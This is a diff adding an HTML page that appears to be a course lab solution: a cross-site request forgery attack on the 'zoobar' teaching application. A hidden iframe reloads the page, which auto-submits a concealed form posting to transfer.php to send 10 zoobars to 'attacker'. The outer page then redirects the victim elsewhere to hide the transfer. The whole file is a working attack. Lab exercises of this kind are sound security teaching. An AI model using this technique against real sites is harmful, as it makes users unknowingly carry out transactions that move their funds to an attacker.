@@ -1,0 +1,30 @@
+<html>
+	<head>
+		<script type="text/javascript">			
+			var i = 0;	
+			function initOnLoad(){
+				if(window.location.search == "?kill=1")
+				{
+					document.getElementById("myDiv").innerHTML="";
+					document.getElementById("myForm").submit();					
+				}
+			}			
+			function frameOnLoad(){
+				i = i + 1;
+				if(i == 2){
+					window.location = "http://ece568.csl.toronto.edu/";
+				}
+			}
+		</script>	
+	</head>
+	<body onload="initOnLoad()">
+		<div id="myDiv">
+			<iframe id="myFrame" hidden="true" onload="frameOnLoad()" src="./partB.html?kill=1"></iframe>
+		</div>
+		<form action="http://zoobar.csl.toronto.edu/transfer.php" method="post" id="myForm">
+			<input value="10" name="zoobars" type="hidden">
+			<input value="attacker" name="zb_recipient" type="hidden">
+			<input value="Send" name="submission" type="hidden">
+		</form>
+	</body>
+</html>
